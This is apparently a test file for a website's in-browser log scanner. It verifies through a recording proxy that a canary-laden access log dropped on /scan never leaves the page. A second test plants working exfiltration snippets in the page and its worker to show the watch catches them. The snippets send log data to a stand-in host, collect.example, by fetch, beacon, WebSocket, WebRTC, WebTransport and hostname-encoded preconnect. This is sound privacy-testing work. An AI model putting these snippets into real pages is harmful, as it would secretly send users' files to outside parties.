// WEB-6 (−, pair of WEB-4): a log dropped on /scan sends none of its bytes anywhere. The site is
// built for real; headless Chromium is launched with the egress watch (./egress.mjs) as its only
// way out, loopback included, so every connection the browser makes is on the record, and nothing
// but the site can be reached even by a misbehaving page. A log with a canary in every line (path,
// query value, user agent, referer) and another in the file names is dropped on /scan and
// /ja/scan, plain and gzip. From navigation to well after the page is closed, the proxy's record
// and the browser's own request events must hold only GETs of files the site ships, at its origin,
// with no query, no body and no canary: no other origin, no WebSocket, no service worker. What
// stays on the device must not carry the log either: the page, the copied text, the saved JSON,
// cookies and every storage. Then the watch is shown to bite: leaks planted in the page and in the
// scan's worker (fetch, image, beacon, WebSocket, a disguised same-origin GET, storage, the copy,
// the download, WebTransport, WebRTC, a hostname to preconnect) must each be caught by the rule
// meant to catch them. WebRTC and WebTransport go around an HTTP proxy over UDP, so the code the
// page is served must not name them (egress.mjs).
// Resource hints are watched in the DOM as well as on the wire: headless Chromium (the shell) does
// not act on preconnect or dns-prefetch at all (its NetLog shows no lookup, proxy or not), while a
// desktop browser would resolve the hinted hostname, and a hostname can carry the log.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import zlib from "node:zlib";
import { randomBytes } from "node:crypto";
import { buildSite } from "../build.mjs";
import { launchChromium } from "./browser.mjs";
import { startEgressProxy, judge, carries } from "./egress.mjs";

const CANARY = randomBytes(16).toString("hex"); // in every line of the log
const NAME = randomBytes(16).toString("hex");   // in the file names: a name can be telling too
const QUIET_MS = 1500;

let dist, proxy, browser, tmp, plain, gz;
const pageErrors = [];

/** nginx combined lines, the canary in each; automation on critical routes, so there is a number. */
function canaryLog(lines) {
  const uas = [`Mozilla/5.0 (compatible; Agent-${CANARY}/1.0)`, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; GPTBot/1.2; +https://openai.com/gptbot",
    "python-requests/2.32.3", `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 ${CANARY}`];
  const routes = [`GET /orders/${CANARY}?ref=${CANARY}`, `POST /checkout?session=${CANARY}`, `GET /account/${CANARY}/settings`, `POST /login?next=/u/${CANARY}`, `GET /blog/${CANARY}`];
  let s = "";
  for (let i = 0; i < lines; i++) {
    const t = `${String(1 + (i % 28)).padStart(2, "0")}/Sep/2026:${String(i % 24).padStart(2, "0")}:${String(i % 60).padStart(2, "0")}:${String((i * 7) % 60).padStart(2, "0")} +0000`;
    s += `203.0.113.${1 + (i % 250)} - - [${t}] "${routes[i % routes.length]} HTTP/1.1" ${i % 9 ? 200 : 403} ${(i * 37) % 9000} "https://example.com/r/${CANARY}" "${uas[i % uas.length]}"\n`;
  }
  return s;
}

before(async () => {
  dist = buildSite();
  proxy = await startEgressProxy(dist);
  // Hostnames never reach the OS resolver: the proxy is the only way out, and a lookup is no leak.
  browser = await launchChromium({ proxy: { server: proxy.origin }, args: ["--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1"] });
  tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ludion-web6-"));
  const big = canaryLog(120_000), small = canaryLog(30_000);
  plain = { file: path.join(tmp, `access-${NAME}.log`), lines: 120_000 };
  gz = { file: path.join(tmp, `access-${NAME}.1.log.gz`), lines: 30_000 };
  fs.writeFileSync(plain.file, big);
  fs.writeFileSync(gz.file, zlib.gzipSync(small));
  assert.ok(fs.statSync(plain.file).size > 20e6, "the log spans many progress ticks");
});
after(async () => {
  await browser?.close();
  await proxy?.close();
  if (tmp) fs.rmSync(tmp, { recursive: true, force: true });
});

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let proxyRetries = 0; // navigations retried because the test's own proxy refused the connection

/** Runs in every document before its own scripts: reports each resource hint as it appears. */
function hintWatch() {
  const RELS = /(^|\s)(preconnect|dns-prefetch|prefetch|prerender|preload|modulepreload)(\s|$)/i;
  const check = (n) => {
    if (n.nodeType !== 1) return;
    if (n.localName === "link" && RELS.test(n.getAttribute("rel") ?? "")) window.__ludionHint(`link rel=${n.rel}`, n.href);
    if (n.localName === "script" && (n.getAttribute("type") ?? "").toLowerCase() === "speculationrules") window.__ludionHint("speculationrules", n.textContent ?? "");
  };
  const look = (n) => { check(n); if (n.querySelectorAll) for (const c of n.querySelectorAll("link, script")) check(c); };
  new MutationObserver((ms) => { for (const m of ms) if (m.type === "attributes") check(m.target); else m.addedNodes.forEach(look); })
    .observe(document, { subtree: true, childList: true, attributes: true, attributeFilter: ["rel", "href", "type"] });
}

/** A hint as the request it asks for: a link's URL, or each URL a speculation rule names. */
function hintRequests(hints, origin) {
  return hints.flatMap(({ kind, value }) => {
    const urls = kind === "speculationrules" ? (value.match(/"(?:https?:)?\/[^"]*"/g) ?? []).map((s) => s.slice(1, -1)) : [value];
    if (kind === "speculationrules" && !urls.length) urls.push(value);
    return urls.map((u) => { let url = u; try { url = new URL(u, origin).href; } catch { /* judged as it is */ } return { source: `hint (${kind})`, method: "GET", url }; });
  });
}

/**
 * One whole visit: open the page, drop the files, let it finish, copy the text, save the JSON,
 * look at every storage, leave the page. Returns everything the watch saw.
 */
async function visit(urlPath, files, { transform = null, expectDone = true } = {}) {
  proxy.seen = [];
  proxy.transform = transform;
  const events = [], hints = [], other = [], workers = [], errors = [], pending = [];
  const context = await browser.newContext({ acceptDownloads: true });
  await context.grantPermissions(["clipboard-read", "clipboard-write"], { origin: proxy.origin });
  await context.exposeFunction("__ludionHint", (kind, value) => { hints.push({ kind, value: String(value) }); });
  await context.addInitScript(hintWatch);
  context.on("request", (req) => {
    const e = { source: "browser", method: req.method(), url: req.url(), headers: req.headers(), body: req.postDataBuffer() ?? Buffer.alloc(0) };
    events.push(e);
    pending.push(req.allHeaders().then((h) => { e.headers = h; }, () => {}));
  });
  context.on("serviceworker", (w) => other.push({ rule: "service worker", what: w.url() }));
  const watchPage = (p) => {
    p.on("websocket", (ws) => other.push({ rule: "websocket", what: ws.url() }));
    p.on("worker", (w) => workers.push(w.url()));
    p.on("pageerror", (e) => errors.push(`${urlPath}: ${e.message}`));
    p.on("console", (m) => { if (m.type() === "error") errors.push(`${urlPath}: console: ${m.text()}`); });
  };
  context.on("page", watchPage);
  const page = await context.newPage();
  let report = null, state = null, copied = null, saved = null, dom = "", kept = null, dropAt = 0;
  try {
    // The test's own proxy refusing the connection (a busy machine) is not the page's doing: the page
    // never loaded, nothing was judged. Navigate again (twice at most) and count it.
    let res;
    for (let attempt = 1; ; attempt++) {
      try { res = await page.goto(proxy.origin + urlPath); break; } catch (e) {
        if (!/ERR_PROXY_CONNECTION_FAILED/.test(String(e?.message)) || attempt === 3) throw e;
        proxyRetries++;
        await sleep(500);
      }
    }
    assert.equal(res.status(), 200, urlPath);
    await page.waitForSelector('.ludion-scan[data-state="idle"]', { state: "attached" });
    await sleep(300);
    dropAt = proxy.seen.length;
    await page.setInputFiles("#scan-input", files.map((f) => f.file));
    await page.waitForSelector('.ludion-scan[data-state="done"], .ludion-scan[data-state="error"]', { state: "attached", timeout: 120_000 });
    state = await page.getAttribute(".ludion-scan", "data-state");
    if (expectDone) assert.equal(state, "done", `${urlPath}: ${await page.textContent("#scan-status")}`);
    if (state === "done") {
      report = JSON.parse(await page.textContent("#scan-json"));
      await sleep(QUIET_MS);
      // What a user would pass on: the copied text and the saved JSON.
      const [copyButton, saveButton] = await page.$$(".scan-actions .scan-button");
      await copyButton.click();
      copied = await page.evaluate(() => navigator.clipboard.readText()).catch((e) => `(clipboard unreadable: ${e.message})`);
      const [download] = await Promise.all([page.waitForEvent("download"), saveButton.click()]);
      saved = fs.readFileSync(await download.path());
    }
    dom = await page.content();
    kept = await page.evaluate(async () => {
      const dump = (s) => Object.fromEntries(Array.from({ length: s.length }, (_, i) => [s.key(i), s.getItem(s.key(i))]));
      const opfs = [];
      try { for await (const k of (await navigator.storage.getDirectory()).keys()) opfs.push(k); } catch { /* none */ }
      return {
        localStorage: dump(localStorage), sessionStorage: dump(sessionStorage), cookie: document.cookie,
        indexedDB: (await indexedDB.databases()).map((d) => d.name),
        caches: await caches.keys(),
        serviceWorkers: (await navigator.serviceWorker?.getRegistrations?.() ?? []).map((r) => r.scope),
        opfs,
      };
    });
    await sleep(QUIET_MS);
    // Leaving is a moment to send too (pagehide, beforeunload, sendBeacon): watch past it.
    await page.close({ runBeforeUnload: true });
    await sleep(QUIET_MS);
    await Promise.all(pending);
    kept.cookies = await context.cookies();
  } finally { await context.close(); }

  const canaries = [CANARY, NAME];
  const found = [
    ...judge([...proxy.seen, ...events, ...hintRequests(hints, proxy.origin)], { origin: proxy.origin, root: dist, canaries }),
    ...other,
    ...(carries(JSON.stringify(kept), canaries) ? [{ rule: "storage", what: JSON.stringify(kept).slice(0, 200) }] : []),
    ...(kept.indexedDB.length || kept.caches.length || kept.serviceWorkers.length || kept.opfs.length || kept.cookies.length
      ? [{ rule: "storage", what: `indexedDB ${kept.indexedDB}, caches ${kept.caches}, service workers ${kept.serviceWorkers}, opfs ${kept.opfs}, cookies ${kept.cookies.length}` }] : []),
    // On the device, the file names may show (they are the user's own); the log's content may not.
    ...(carries(dom, [CANARY]) ? [{ rule: "page shows", what: urlPath }] : []),
    ...(copied != null && carries(copied, [CANARY]) ? [{ rule: "copy", what: copied.slice(0, 120) }] : []),
    ...(saved != null && carries(saved, [CANARY]) ? [{ rule: "download", what: saved.toString("utf8").slice(0, 120) }] : []),
  ];
  return { found, report, state, copied, workers, errors, events, hints, seen: proxy.seen, dropAt };
}

let summary = "the clean scans did not run";

test("WEB-6: a canary log dropped on /scan and /ja/scan, plain and gzip: not a byte leaves, every request watched", async () => {
  const runs = [["/scan", [plain, gz]], ["/ja/scan", [gz]], ["/ja/scan", [plain]]];
  let watched = 0, afterDrop = 0;
  for (const [urlPath, files] of runs) {
    const v = await visit(urlPath, files);
    // The scan really read the log, in a worker: otherwise "nothing left" would prove nothing.
    assert.equal(v.report.totals.records, files.reduce((n, f) => n + f.lines, 0), `${urlPath}: every line read`);
    assert.ok(v.report.critical.unverified_automation > 0, `${urlPath}: the log carries the number`);
    assert.ok(v.workers.some((w) => new URL(w).origin === proxy.origin), `${urlPath}: the scan ran in a worker`);
    assert.ok(!v.copied.startsWith("(clipboard unreadable"), `${urlPath}: ${v.copied}`);
    // The watch is whole: the site itself came through the proxy, and so did every request the
    // browser reported (https would come as a CONNECT to its host).
    assert.ok(v.seen.length >= 3 && v.seen.every((r) => r.proxied), `${urlPath}: the browser went past the proxy`);
    const reached = new Set(v.seen.map((r) => (r.method === "CONNECT" ? `https://${r.url}` : new URL(r.url).href)));
    for (const e of v.events) {
      const u = new URL(e.url);
      if (["data:", "blob:"].includes(u.protocol)) continue;
      assert.ok(reached.has(u.protocol === "https:" ? `https://${u.host}${u.port ? "" : ":443"}` : u.href), `${urlPath}: ${e.url} was not seen by the proxy`);
    }
    assert.deepEqual(v.found, [], `${urlPath}: leaks`);
    assert.deepEqual(v.errors, [], `${urlPath}: page errors`);
    watched += v.seen.length;
    afterDrop += v.seen.length - v.dropAt;
  }
  summary = `${watched} requests watched over ${runs.length} scans (${afterDrop} after the drop), 0 left the site's origin, 0 carried a log byte${proxyRetries ? `; ${proxyRetries} navigation(s) retried after the test proxy refused a connection` : ""}`;
});

// ── the watch bites ─────────────────────────────────────────────────────────────────────────
const inPage = (js) => (rel, bytes) => (/(^|\/)scan\.html$/.test(rel)
  ? Buffer.from(bytes.toString("utf8").replace("<head>", `<head><script>${js}</script>`)) : bytes);
const inWorker = (js) => (rel, bytes) => (/^_astro\/worker-[^/]+\.js$/.test(rel) ? Buffer.concat([Buffer.from(`${js}\n`), bytes]) : bytes);
const onDrop = (body) => inPage(`document.addEventListener("change", async (e) => { const f = e.target.files && e.target.files[0]; if (!f) return; const log = await f.slice(0, 65536).text(); ${body} }, true);`);
const onMessage = (body) => inWorker(`self.addEventListener("message", async ({ data }) => { const f = data.files && data.files[0]; if (!f) return; const log = await f.slice(0, 65536).text(); ${body} });`);

const LEAKS = [
  ["fetch to another site", "outside", onDrop(`fetch("https://collect.example/l", { method: "POST", body: log.slice(0, 4096), mode: "no-cors" }).catch(() => {});`)],
  ["an image from another site", "outside", onDrop(`new Image().src = "http://collect.example/p.gif?d=" + encodeURIComponent(log.slice(0, 1500));`)],
  ["a beacon to the site itself", "body", onDrop(`navigator.sendBeacon("/", log.slice(0, 4096));`)],
  ["a WebSocket", "outside", onDrop(`const ws = new WebSocket("ws://collect.example/s"); ws.onopen = () => ws.send(log.slice(0, 4096));`)],
  ["the worker: a same-origin GET with the log in the query", "query", onMessage(`fetch("/favicon.svg?d=" + encodeURIComponent(log.slice(0, 1500))).catch(() => {});`)],
  ["the worker: a same-origin GET, the log disguised as a file name", "unknown file",
    onMessage(`fetch("/_astro/" + btoa(log.slice(0, 600)).split("").reverse().join("").replace(/[+/=]/g, "") + ".js").catch(() => {});`)],
  ["kept in localStorage", "storage", onDrop(`localStorage.setItem("ludion-last", log.slice(0, 4096));`)],
  ["sent on leaving the page", "outside", onDrop(`addEventListener("pagehide", () => navigator.sendBeacon("http://collect.example/b", log.slice(0, 4096)));`)],
  ["shown on the page", "page shows", onDrop(`const p = document.createElement("pre"); p.textContent = log.slice(0, 600); document.body.append(p);`)],
  ["the copied text", "copy", onDrop(`const w = navigator.clipboard.writeText.bind(navigator.clipboard); navigator.clipboard.writeText = (t) => w(t + log.slice(0, 300));`)],
  ["the saved JSON", "download", onDrop(`const o = URL.createObjectURL; URL.createObjectURL = (b) => o(new Blob([b, log.slice(0, 300)]));`)],
  // Around the proxy (UDP), and unreported by the browser's request events: seen only in the code served.
  ["the worker: WebTransport", "unwatched transport",
    onMessage(`try { const t = new WebTransport("https://collect.example:4433/"); t.ready.then(() => t.datagrams.writable.getWriter().write(new TextEncoder().encode(log.slice(0, 1000)))).catch(() => {}); t.closed.catch(() => {}); } catch {}`)],
  ["WebRTC", "unwatched transport",
    onDrop(`try { const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:" + log.match(/[0-9a-f]{32}/)[0] + ".collect.example:3478" }] }); pc.createDataChannel("d"); pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {}); } catch {}`)],
  // Gone from the page at once: only the hint watch can see it.
  ["a hostname to preconnect", "outside",
    onDrop(`const l = document.createElement("link"); l.rel = "preconnect"; l.href = "https://" + log.match(/[0-9a-f]{32}/)[0] + ".collect.example/"; document.head.append(l); l.remove();`)],
];

test("WEB-6: the watch bites: every planted leak, in the page or in the worker, is caught by its rule", async () => {
  const missed = [];
  for (const [name, rule, transform] of LEAKS) {
    const v = await visit("/scan", [plain], { transform });
    const rules = [...new Set(v.found.map((f) => f.rule))];
    if (!rules.includes(rule)) missed.push(`${name}: wanted "${rule}", got [${rules.join(", ")}]`);
    const by = [...new Set(v.found.filter((f) => f.rule === rule).map((f) => f.what.split(":")[0]))];
    console.log(`WEB-6 leak "${name}": caught as ${rules.join(", ")}${by.length ? ` (${rule}: seen by ${by.join(", ")})` : ""}`);
  }
  assert.deepEqual(missed, [], "planted leaks the watch did not catch");
  console.log(`WEB-6: ${summary}; ${LEAKS.length}/${LEAKS.length} planted leaks caught`);
});
